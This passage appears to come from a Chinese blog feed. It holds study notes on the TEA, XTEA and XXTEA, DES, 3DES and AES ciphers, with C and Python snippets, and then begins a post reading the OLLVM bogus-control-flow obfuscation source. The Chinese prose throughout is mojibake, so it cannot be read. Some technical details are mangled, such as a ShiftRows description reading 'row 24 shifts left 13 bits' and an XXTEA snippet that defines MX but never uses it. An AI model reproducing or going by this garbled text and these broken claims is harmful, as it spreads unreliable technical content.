è§£å¯†çš„æ“ä½œï¼Œè¯¥ç®—æ³•å°†XTEAè½®å¾ªå‡½æ•°ä¾æ¬¡åº”ç”¨äºå—ä¸­çš„æ¯ä¸ªå­—ï¼Œå¹¶ä¸”å°†å®ƒé™„åŠ äºè¢«åº”ç”¨å­—çš„é‚»å­—ã€‚</p><p><strong>XXTEA</strong>ä½¿ç”¨è·ŸBlock TEAç›¸ä¼¼çš„ç»“æ„ï¼Œä½†åœ¨å¤„ç†å—ä¸­æ¯ä¸ªå­—æ—¶åˆ©ç”¨äº†ç›¸é‚»å­—ï¼Œä¸”ç”¨æ‹¥æœ‰<strong>ä¸¤ä¸ªè¾“å…¥é‡çš„MXå‡½æ•°</strong>ä»£æ›¿äº†XTEAè½®å¾ªå‡½æ•°ã€‚ä¸Šé¢æåˆ°çš„ç›¸é‚»å­—å…¶å®å°±æ˜¯æ•°ç»„ä¸­ç›¸é‚»çš„é¡¹ã€‚</p><div class="table-container"><table><thead><tr><th>ç®—æ³•</th><th>å¹´ä»£</th><th>è®¾è®¡ç›®æ ‡</th><th>ç¼ºç‚¹ / æ”¹è¿›åŠ¨å› </th></tr></thead><tbody><tr><td><strong>TEA</strong></td><td>1994</td><td>ç®€æ´ã€å¿«é€Ÿçš„åŠ å¯†ç®—æ³•</td><td>å­˜åœ¨<strong>ç›¸å…³å¯†é’¥æ”»å‡»</strong>ï¼Œå¼±ç‚¹å·²çŸ¥</td></tr><tr><td><strong>XTEA</strong></td><td>1997</td><td>ä¿®å¤ TEA çš„å¼±ç‚¹</td><td>ç®—æ³•ç»“æ„ä»ç„¶å®¹æ˜“åˆ†æ</td></tr><tr><td><strong>XXTEA</strong></td><td>1998</td><td>å®Œå…¨é‡æ„çš„å—åŠ å¯†ç®—æ³•</td><td>æ›´å®‰å…¨ï¼Œç»“æ„é Feistel</td></tr></tbody></table></div><h2 id="Feistelç»“æ„"><a href="#Feistelç»“æ„" class="headerlink" title="Feistelç»“æ„"></a>Feistelç»“æ„</h2><ul><li>TEAå’ŒXTEA<strong>éƒ½æ˜¯</strong>Feistelç½‘ç»œ</li><li>XXTEA<strong>å®Œå…¨æ‘†è„±</strong>Feustelç½‘ç»œ</li></ul><p>Feistel ç½‘ç»œï¼ˆFeistel Networkï¼‰æ˜¯ä¸€ç§<strong>åŠ å¯†ç®—æ³•çš„ç»“æ„æ¡†æ¶</strong>ã€‚<br>è®¾è®¡ç†å¿µï¼š</p><blockquote><p>æŠŠä¸€ä¸ªä¸œè¥¿â€œæ‹†æˆå·¦å³ä¸¤åŠâ€ï¼Œç„¶åé€šè¿‡åå¤ã€å¯¹ç§°çš„æ–¹å¼è¿­ä»£åŠ å¯†ã€‚</p></blockquote><h3 id="Feistel-ç½‘ç»œç»“æ„å›¾"><a href="#Feistel-ç½‘ç»œç»“æ„å›¾" class="headerlink" title="Feistel ç½‘ç»œç»“æ„å›¾"></a>Feistel ç½‘ç»œç»“æ„å›¾</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">åŸå§‹æ˜æ–‡å—:  (L0, R0)   <span class="comment">#åŸå§‹æ•°æ®è¢«æ‹†æˆçš„ä¸¤éƒ¨åˆ†</span></span><br><span class="line"></span><br><span class="line">ä¸€è½®åŠ å¯†æ“ä½œï¼š</span><br><span class="line">L1 = R0</span><br><span class="line">R1 = L0 âŠ• F(R0, K0)   <span class="comment">#è½®å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">è¾“å‡ºå¯†æ–‡å—: (L1, R1)</span><br></pre></td></tr></table></figure><h2 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h2><ul><li>åˆ†ç»„åŠ å¯†:<br>TEAç®—æ³•å°†64ä½æ˜æ–‡åˆ†æˆä¸¤ä¸ª32ä½çš„éƒ¨åˆ†ï¼ˆV0 å’ŒV1ï¼‰ï¼Œä½¿ç”¨128ä½å¯†é’¥åˆ†æˆå››ä¸ª32ä½çš„éƒ¨åˆ†ï¼ˆK0ï¼ŒK1ï¼ŒK2ï¼ŒK3ï¼‰ã€‚</li><li><p>è¿­ä»£è¿‡ç¨‹ï¼š<br>ç®—æ³•é€šè¿‡å¤šæ¬¡è¿­ä»£ï¼ˆå¾ªç¯ï¼‰è¿›è¡ŒåŠ å¯†ï¼Œæ¯æ¬¡è¿­ä»£å¯¹æ˜æ–‡åˆ†ç»„è¿›è¡Œå˜æ¢ã€‚</p><ul><li><p>å˜æ¢:<br>æ¯æ¬¡è¿­ä»£éƒ½ä¼šå¯¹æ˜æ–‡åˆ†ç»„è¿›è¡Œéçº¿æ€§å˜æ¢ï¼ŒåŒ…æ‹¬åŠ æ³•ã€å·¦ç§»ã€å³ç§»ç­‰æ“ä½œã€‚</p></li><li><p>å¯†é’¥ä½¿ç”¨ï¼š:<br>å¯†é’¥çš„æ¯ä¸ªéƒ¨åˆ†åœ¨æ¯è½®è¿­ä»£ä¸­éƒ½ä¼šè¢«ä½¿ç”¨ï¼Œä»¥ç¡®ä¿åŠ å¯†çš„å®‰å…¨æ€§ã€‚</p></li><li><p>Delta (Î´):<br>å¸¸é‡Î´ï¼ˆ0x9e3779b9ï¼‰åœ¨æ¯ä¸€è½®è¿­ä»£ä¸­ç´¯åŠ ï¼Œä½¿å¾—æ¯è½®çš„åŠ å¯†ä¸å‰ä¸€è½®ä¸åŒï¼Œä»è€Œæå‡æŠ—å·®åˆ†æ”»å‡»èƒ½åŠ›ã€‚</p></li></ul></li><li><p>å¾ªç¯æ¬¡æ•°:<br>ç®—æ³•çš„å¾ªç¯æ¬¡æ•°å½±å“åŠ å¯†çš„å¼ºåº¦ã€‚å»ºè®®ä½¿ç”¨32è½®æˆ–64è½®çš„è¿­ä»£ï¼Œå¯ä»¥æ ¹æ®å…·ä½“åº”ç”¨åœºæ™¯è°ƒæ•´ã€‚</p></li></ul><ul><li>è§£å¯†:<br>è§£å¯†è¿‡ç¨‹ä¸åŠ å¯†è¿‡ç¨‹ç›¸ä¼¼ï¼Œä½†æ–¹å‘ç›¸åï¼Œä½¿ç”¨ç›¸åŒçš„å¯†é’¥å’Œå¾ªç¯æ¬¡æ•°å³å¯ã€‚<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ecbtea_encrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], i;</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h2></li><li>ä¸å†ä½¿ç”¨å¯¹ç§°ç»“æ„ï¼Œè€Œæ˜¯äº¤æ›¿å¤„ç†<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">sum += delta;</span><br><span class="line">v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br></pre></td></tr></table></figure></li></ul><h2 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h2><p>æ‰©å±•äº†åŠ å¯†å—å¤§å°ï¼Œå¯ä»¥å¤„ç†<strong>ä»»æ„é•¿åº¦</strong>çš„æ•°æ®å—ï¼ˆè‡³å°‘64ä½ï¼‰ã€‚</p><ul><li>å°†æ•°æ®åˆ†æˆ32ä½å­—æ•°ç»„ï¼ˆV[0]â€¦V[n-1]ï¼‰</li><li>ä»ä½¿ç”¨128ä½å¯†é’¥ï¼ˆK0-K3ï¼‰</li></ul><p>ä¼˜ç‚¹</p><ul><li>å¯å˜å—å¤§å°ï¼šå¯ä»¥å¤„ç†ä»»æ„é•¿åº¦æ•°æ®å—</li><li>æ›´å¼ºçš„å®‰å…¨æ€§ï¼šæ›´å¤æ‚çš„æ··åˆå‡½æ•°</li><li>æ•´ä½“å¤„ç†ï¼šå¯¹æ•´ä¸ªæ•°æ®å—è¿›è¡Œæ“ä½œ</li><li>ä¿æŒç®€å•æ€§ï¼šå®ç°ä»ç›¸å¯¹ç®€å•<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">sum = rounds * delta;</span><br><span class="line"><span class="keyword">while</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">    e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">for</span> (p = n<span class="number">-1</span>; p &gt; <span class="number">0</span>; p--) &#123;</span><br><span class="line">        z = V[p<span class="number">-1</span>];</span><br><span class="line">        V[p] -= ((z &lt;&lt; <span class="number">4</span> ^ z &gt;&gt; <span class="number">5</span>) + z) ^ (sum + K[(p &amp; <span class="number">3</span>) ^ e]);</span><br><span class="line">    &#125;</span><br><span class="line">    z = V[n<span class="number">-1</span>];</span><br><span class="line">    V[<span class="number">0</span>] -= ((z &lt;&lt; <span class="number">4</span> ^ z &gt;&gt; <span class="number">5</span>) + z) ^ (sum + K[(<span class="number">0</span> &amp; <span class="number">3</span>) ^ e]);</span><br><span class="line">    sum -= delta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="DES-amp-AES"><a href="#DES-amp-AES" class="headerlink" title="DES &amp; AES"></a>DES &amp; AES</h1><h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><p><strong>ç‰¹æ€§ï¼š</strong></p><ul><li><strong>åˆ†ç»„åŠ å¯†</strong>ï¼šæ¯æ¬¡åŠ å¯† <strong>64 ä½</strong>ï¼ˆ8 å­—èŠ‚ï¼‰ çš„æ˜æ–‡å—ã€‚</li><li>å¯†é’¥é•¿åº¦ï¼š<strong>64 ä½å¯†é’¥</strong>ï¼ˆå…¶ä¸­ 8 ä½ç”¨äºå¥‡å¶æ ¡éªŒï¼Œæœ‰æ•ˆå¯†é’¥æ˜¯ 56 ä½ï¼‰ã€‚</li><li>åŠ å¯†è½®æ•°ï¼š<strong>16 è½®</strong> Feistel ç»“æ„ã€‚</li></ul><p><strong>åŠ å¯†è¿‡ç¨‹:</strong><br>1ã€åˆå§‹ç½®æ¢ï¼ˆIPï¼‰<br>2ã€åˆ†ä¸ºå·¦å³ä¸¤éƒ¨åˆ† L0 å’Œ R0ã€‚<br>3ã€è¿›å…¥ 16 è½®è¿­ä»£ï¼Œæ¯è½®ï¼š</p><ul><li>åˆ©ç”¨å­å¯†é’¥å¯¹å³åŠéƒ¨åˆ†åš Feistel å‡½æ•°ï¼ˆåŒ…å«æ‰©å±•ã€å¼‚æˆ–ã€S-box æ›¿ä»£ã€Pç½®æ¢ï¼‰</li><li>ä¸å·¦åŠéƒ¨åˆ†å¼‚æˆ–ï¼Œäº¤æ¢å·¦å³ã€‚</li></ul><p>4ã€æœ€ç»ˆç½®æ¢ï¼ˆIPâ»Â¹ï¼‰<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æ˜æ–‡ (64 ä½)</span><br><span class="line">  â†“ IP åˆå§‹ç½®æ¢</span><br><span class="line">åˆ†ä¸º L0 å’Œ R0 å„ 32 ä½</span><br><span class="line">  â†“ è¿›å…¥ 16 è½®è¿­ä»£ï¼š</span><br><span class="line">      Li = Ri-1</span><br><span class="line">      Ri = Li-1 âŠ• F(Ri-1, Ki)</span><br><span class="line">  â†“ åˆå¹¶ L16 å’Œ R16</span><br><span class="line">  â†“ IPâ»Â¹ é€†ç½®æ¢</span><br><span class="line">â†’ å¯†æ–‡</span><br></pre></td></tr></table></figure><br>æ¯è½®ç»“æ„ï¼šFeistel Round<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šLi-1, Ri-1, Ki</span><br><span class="line">F(Ri-1, Ki):</span><br><span class="line">    - æ‰©å±•ç½®æ¢ E (32 â†’ 48 ä½)</span><br><span class="line">    - ä¸å­å¯†é’¥ Ki å¼‚æˆ–</span><br><span class="line">    - S-box æ›¿æ¢ï¼ˆ8 ä¸ª S-boxï¼š48 â†’ 32 ä½ï¼‰</span><br><span class="line">    - P ç½®æ¢ï¼ˆé‡æ’ï¼‰</span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line">    Li = Ri-1</span><br><span class="line">    Ri = Li-1 âŠ• F(Ri-1, Ki)</span><br></pre></td></tr></table></figure></p><h2 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h2><blockquote><p>3DES = DES Ã— 3</p></blockquote><h3 id="å¯†é’¥æ¨¡å¼"><a href="#å¯†é’¥æ¨¡å¼" class="headerlink" title="å¯†é’¥æ¨¡å¼"></a>å¯†é’¥æ¨¡å¼</h3><p>3DES ä½¿ç”¨ 3 ä¸ªå­å¯†é’¥ï¼ˆK1ã€K2ã€K3ï¼‰ï¼š</p><ul><li><strong>3-key æ¨¡å¼</strong>ï¼šK1 â‰  K2 â‰  K3 â†’ å…± 168 ä½å¯†é’¥ï¼›</li><li><strong>2-key æ¨¡å¼</strong>ï¼šK1 = K3 â†’ å…± 112 ä½å¯†é’¥ï¼›</li><li><strong>1-key æ¨¡å¼</strong>ï¼šK1 = K2 = K3 â†’ å®é™…å°±æ˜¯æ™®é€š DESï¼Œä¸æ¨èä½¿ç”¨ã€‚</li></ul><h3 id="åŠ å¯†è¿‡ç¨‹"><a href="#åŠ å¯†è¿‡ç¨‹" class="headerlink" title="åŠ å¯†è¿‡ç¨‹"></a>åŠ å¯†è¿‡ç¨‹</h3><p>é»˜è®¤ä½¿ç”¨ <strong>EDE</strong> æ¨¡å¼ï¼šEncrypt â†’ Decrypt â†’ Encrypt</p><p>${\displaystyle {\textrm {ciphertext}}=E<em>{K3}ï¼ˆD</em>{K2}ï¼ˆE_{K1}ï¼ˆ{\textrm {plaintext}}ï¼‰ï¼‰ï¼‰.}$</p><ul><li>ç¬¬ä¸€æ¬¡ï¼šä½¿ç”¨ K1 åŠ å¯†ï¼›</li><li>ç¬¬äºŒæ¬¡ï¼šä½¿ç”¨ K2 è§£å¯†ï¼ˆå¢åŠ å¤æ‚æ€§ï¼‰ï¼›</li><li>ç¬¬ä¸‰æ¬¡ï¼šä½¿ç”¨ K3 å†åŠ å¯†ï¼Œå¾—åˆ°æœ€ç»ˆå¯†æ–‡ã€‚</li></ul><h3 id="è§£å¯†è¿‡ç¨‹"><a href="#è§£å¯†è¿‡ç¨‹" class="headerlink" title="è§£å¯†è¿‡ç¨‹"></a>è§£å¯†è¿‡ç¨‹</h3><p>${\displaystyle {\textrm {plaintext}}=D<em>{K1}ï¼ˆE</em>{K2}ï¼ˆD_{K3}ï¼ˆ{\textrm {ciphertext}}ï¼‰ï¼‰ï¼‰ï¼‰.}$<br>ä½¿ç”¨ K3 è§£å¯†,ä½¿ç”¨ K2 åŠ å¯† ï¼Œç„¶åä½¿ç”¨ K1 è§£å¯† </p><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><h3 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h3><ul><li><strong>åˆ†ç»„åŠ å¯†</strong>ï¼šä»¥ <strong>128 ä½ï¼ˆ16 å­—èŠ‚ï¼‰</strong>ä¸ºä¸€ä¸ªåˆ†ç»„å¤„ç†ã€‚</li><li>æ”¯æŒä¸‰ç§å¯†é’¥é•¿åº¦ï¼š<ul><li>AES-128ï¼š10 è½®</li><li>AES-192ï¼š12 è½®</li><li>AES-256ï¼š14 è½®</li></ul></li></ul><h3 id="åŠ å¯†è¿‡ç¨‹-1"><a href="#åŠ å¯†è¿‡ç¨‹-1" class="headerlink" title="åŠ å¯†è¿‡ç¨‹"></a>åŠ å¯†è¿‡ç¨‹</h3><p>åˆå§‹è½®ï¼š</p><ul><li>AddRoundKey</li></ul><p>ä¸»è½®ï¼ˆé‡å¤ 9~13 æ¬¡ï¼‰ï¼š</p><ul><li>å­—èŠ‚ä»£æ¢SubBytes      â†’ å­—èŠ‚æ›¿æ¢ï¼ˆS-boxï¼‰</li><li>è¡Œç§»ä½ShiftRows     â†’ è¡Œç§»ä½</li><li>åˆ—æ··æ·†MixColumns    â†’ åˆ—æ··åˆ</li><li>è½®å¯†é’¥åŠ AddRoundKey   â†’ å¼‚æˆ–å­å¯†é’¥</li></ul><p>æœ€ç»ˆè½®ï¼ˆæ—  MixColumnsï¼‰ï¼š</p><ul><li>SubBytes</li><li>ShiftRows</li><li>AddRoundKey</li></ul><p>1ã€SubBytesï¼ˆS-box æ›¿æ¢ï¼‰</p><ul><li>AES çš„ S-box æ˜¯åŸºäº GF(2â¸) æœ‰é™åŸŸé€†å…ƒ + ä»¿å°„å˜æ¢ï¼Œéçº¿æ€§æå¼ºã€‚</li><li>æ¯ä¸ªå­—èŠ‚ç‹¬ç«‹æ›¿æ¢ï¼Œæå‡æŠ—å·®åˆ†æ”»å‡»èƒ½åŠ›ã€‚<blockquote><p>ä¾‹å¦‚ï¼ŒåŠ å¯†æ—¶ï¼Œè¾“å‡ºçš„å­—èŠ‚S1ä¸º0x12,åˆ™æŸ¥Sç›’çš„ç¬¬0x01è¡Œå’Œ0x02åˆ—ï¼Œå¾—åˆ°å€¼0xc9,ç„¶åæ›¿æ¢S1åŸæœ‰çš„0x12ä¸º0xc9ã€‚</p></blockquote></li></ul><p>2ã€ShiftRowsï¼ˆè¡Œç§»ä½ï¼‰<br>ç¬¬ 24 è¡Œå·¦ç§» 13 ä½ï¼Œå®ç°å­—èŠ‚æ‰©æ•£ã€‚</p><p>3ã€ MixColumnsï¼ˆåˆ—æ··åˆï¼‰</p><ul><li>æ¯åˆ—ä¸å›ºå®šçŸ©é˜µç›¸ä¹˜</li><li>è®¡ç®—åœ¨ GF(2â¸) ä¸Šå®Œæˆ</li></ul><p>4ã€ AddRoundKeyï¼ˆè½®å¯†é’¥å¼‚æˆ–ï¼‰</p><ul><li>æ¯è½®éƒ½ä¸ 128 ä½å­å¯†é’¥å¼‚æˆ–ï¼Œç¡®ä¿å¯†é’¥å‚ä¸æ¯è½®ã€‚</li></ul><h3 id="AES-ECB"><a href="#AES-ECB" class="headerlink" title="AES_ECB"></a>AES_ECB</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">password = <span class="string">b&#x27;secret!!secret!!&#x27;</span>  <span class="comment"># ç§˜é’¥å¿…é¡»ä¸º 16 å­—èŠ‚æˆ–è€… 16 å­—èŠ‚çš„å€æ•°çš„å­—èŠ‚å‹æ•°æ®</span></span><br><span class="line">text = <span class="string">b&#x27;TextTextTextText&#x27;</span>  <span class="comment"># æ˜æ–‡å¿…é¡»ä¸º 16 å­—èŠ‚æˆ–è€… 16 å­—èŠ‚çš„å€æ•°çš„å­—èŠ‚å‹æ•°æ®ï¼Œå¦‚æœä¸å¤Ÿ 16 å­—èŠ‚éœ€è¦è¿›è¡Œè¡¥å…¨</span></span><br><span class="line">aes = AES.new(password, AES.MODE_ECB)  <span class="comment"># åˆ›å»ºä¸€ä¸ª aes å¯¹è±¡</span></span><br><span class="line"><span class="comment"># AES.MODE_ECB è¡¨ç¤ºæ¨¡å¼æ˜¯ ECB æ¨¡å¼</span></span><br><span class="line">en_text = aes.encrypt(text)  <span class="comment"># åŠ å¯†æ˜æ–‡</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å¯†æ–‡ï¼š&quot;</span>, en_text)  <span class="comment"># åŠ å¯†æ˜æ–‡ï¼Œbytes ç±»å‹</span></span><br><span class="line">de_text = aes.decrypt(en_text)  <span class="comment"># è§£å¯†å¯†æ–‡</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;æ˜æ–‡ï¼š&quot;</span>, de_text)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">å¯†æ–‡ï¼š b&#x27;\t9\x9b\xc5\x19E\xeb4oL\x1a`\xc7\x8b\xd4\xb2&#x27;</span></span><br><span class="line"><span class="string">æ˜æ–‡ï¼š b&#x27;TextTextTextText&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®°æ•´ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŠ å¯†ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ollvm_BCFæºç é˜…è¯»</title>
      <link href="/2025/06/15/ollvm-BCF%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
      <url>/2025/06/15/ollvm-BCF%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="è™šå‡æ§åˆ¶æµ-BCF-Bogus-Control-Flow"><a href="#è™šå‡æ§åˆ¶æµ-BCF-Bogus-Control-Flow" class="headerlink" title="è™šå‡æ§åˆ¶æµ BCF (Bogus Control Flow)"></a>è™šå‡æ§åˆ¶æµ BCF (Bogus Control Flow)</h1><h2 id="åŸç†ï¼š"><a href="#åŸç†ï¼š" class="headerlink" title="åŸç†ï¼š"></a>åŸç†ï¼š</h2><ul><li>è™šå‡æ§åˆ¶æµæ··æ·†é€šè¿‡åŠ å…¥åŒ…å«ä¸é€æ˜è°“è¯çš„æ¡ä»¶è·³è½¬ï¼ˆæ°¸çœŸoræ°¸å‡ï¼‰å’Œä¸å¯è¾¾çš„åŸºæœ¬å—ï¼Œæ¥å¹²æ‰° IDA çš„æ§åˆ¶æµåˆ†æå’Œ F5 åæ±‡ç¼–ã€‚</li></ul><h2 id="åæ··æ·†ï¼š"><a href="#åæ··æ·†ï¼š" class="headerlink" title="åæ··æ·†ï¼š"></a>åæ··æ·†ï¼š</h2><p>1ã€å°†å…¨å±€å˜é‡èµ‹å€¼å¹¶å°† segment è®¾ä¸ºåªè¯»ã€‚</p><ul><li>å¯¹äºå¸¸è§„çš„ ollvm çš„ bcf æ··æ·†æ¥è¯´ï¼Œbcf çš„ä¸é€æ˜è°“è¯éƒ½æ˜¯å¤„äº .bssæ®µ ä¸­ã€‚</li><li>Edit-&gt;Segments-&gt;Edit segment å°† Write å¤é€‰æ¡†å–æ¶ˆå‹¾é€‰ï¼Œ .bssæ®µ å°±è®¾ä¸ºåªè¯»</li></ul><p>2ã€d810 </p><p>3ã€idapython patch ä¸é€æ˜è°“è¯</p><h2 id="æºç ä½ç½®ï¼š"><a href="#æºç ä½ç½®ï¼š" class="headerlink" title="æºç ä½ç½®ï¼š"></a>æºç ä½ç½®ï¼š</h2><p>obfuscator\lib\Transforms\Obfuscation\BogusControlFlow.cpp</p><h2 id="æºç è§£æ"><a href="#æºç è§£æ" class="headerlink" title="æºç è§£æ"></a>æºç è§£æ</h2><h3 id="Passç»“æ„ä¸å‚æ•°"><a href="#Passç»“æ„ä¸å‚æ•°" class="headerlink" title="Passç»“æ„ä¸å‚æ•°"></a>Passç»“æ„ä¸å‚æ•°</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">BogusControlFlow</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> ID; <span class="comment">// Pass identification</span></span><br><span class="line">    <span class="type">bool</span> flag;</span><br><span class="line">    <span class="built_in">BogusControlFlow</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">    <span class="built_in">BogusControlFlow</span>(<span class="type">bool</span> flag) : <span class="built_in">FunctionPass</span>(ID) &#123;<span class="keyword">this</span>-&gt;flag = flag; <span class="built_in">BogusControlFlow</span>();&#125;</span><br></pre></td></tr></table></figure><p>ç»§æ‰¿è‡ª LLVM çš„ FunctionPassã€‚<br>åœ¨ LLVM Pass è®¾è®¡ä¸­ï¼ŒID ç”¨äºæ ‡è¯†æ’ä»¶è‡ªèº«ï¼Œflag å¯ç”¨æ¥æ§åˆ¶æ˜¯å¦å¯¹ç›®æ ‡å‡½æ•°å®é™…ä½œç”¨ï¼ˆå¦‚æŒ‰ç”¨æˆ·å‚æ•°é€‰æ‹©ï¼‰ã€‚è¿™é‡Œæœ‰ä¸¤ä¸ªæ„é€ å‡½æ•°ï¼Œç”¨äºæ¥æ”¶å¯é€‰å‚æ•°ã€‚</p><h2 id="passæµç¨‹ä¸»å…¥å£"><a href="#passæµç¨‹ä¸»å…¥å£" class="headerlink" title="passæµç¨‹ä¸»å…¥å£"></a>passæµç¨‹ä¸»å…¥å£</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;            <span class="comment">//Passçš„æ ¸å¿ƒå…¥å£</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ObfTimes &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">errs</span>()&lt;&lt;<span class="string">&quot;BogusControlFlow application number -bcf_loop=x must be x &gt; 0&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !((ObfProbRate &gt; <span class="number">0</span>) &amp;&amp; (ObfProbRate &lt;= <span class="number">100</span>)) ) &#123;</span><br><span class="line">      <span class="built_in">errs</span>()&lt;&lt;<span class="string">&quot;BogusControlFlow application basic blocks percentage -bcf_prob=x must be 0 &lt; x &lt;= 100&quot;</span>;</span><br><span 